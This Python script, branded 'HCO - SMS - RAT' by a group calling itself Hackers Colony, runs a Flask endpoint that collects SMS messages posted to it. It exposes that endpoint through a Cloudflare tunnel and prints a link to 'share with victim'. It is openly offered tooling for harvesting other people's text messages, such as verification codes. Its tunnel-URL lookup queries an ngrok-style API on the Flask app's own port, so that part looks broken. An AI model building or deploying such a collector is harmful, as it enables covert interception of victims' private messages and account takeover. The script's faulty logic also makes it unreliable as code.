import os
import time
import requests
import subprocess
from flask import Flask, request

# ─────────────────────────────────────────────
# HCO - SMS - RAT | By Hackers Colony
# ─────────────────────────────────────────────

app = Flask(__name__)

@app.route('/sms', methods=['POST'])
def receive_sms():
    sms_data = request.form.to_dict()
    print("\n\033[92m[✓] New SMS Received:\033[0m")
    for key, value in sms_data.items():
        print(f"\033[96m{key}:\033[0m {value}")
    return 'SMS received successfully', 200

def youtube_redirect():
    print("\n\033[91mThis tool is not free.\033[0m")
    print("\033[92mSubscribe to our YouTube channel first...\033[0m")
    time.sleep(2)
    print("\n\033[93mRedirecting to YouTube in 8 seconds...\033[0m")
    time.sleep(8)
    os.system("termux-open-url https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    time.sleep(2)

def start_server():
    print("\n\033[96m[•] Installing requirements...\033[0m")
    os.system("pip install flask requests > /dev/null 2>&1")

    print("\033[96m[•] Starting Flask server...\033[0m")
    os.system("nohup flask run --host=0.0.0.0 --port=4040 &")

    print("\033[96m[•] Starting Cloudflare tunnel...\033[0m")
    os.system("nohup cloudflared tunnel --url http://localhost:4040 > tunnel.log 2>&1 &")
    time.sleep(5)

    # Get the tunnel URL from Cloudflare API
    try:
        response = requests.get("http://127.0.0.1:4040/api/tunnels")
        tunnels = response.json()["tunnels"]
        public_url = tunnels[0]["public_url"]
        print(f"\n\033[92m[✓] Server & Tunnel running.\033[0m")
        print(f"\033[92m[✓] Share this link with victim:\033[0m \033[1;91m{public_url}/sms\033[0m\n")
    except:
        print("\033[91m[!] Failed to get Cloudflare URL. Check if tunnel is running properly.\033[0m")

if __name__ == "__main__":
    os.system("clear")
    print("╔════════════════════════════════╗")
    print("║        HCO - SMS - RAT         ║")
    print("╚════════════════════════════════╝")
    youtube_redirect()
    start_server()
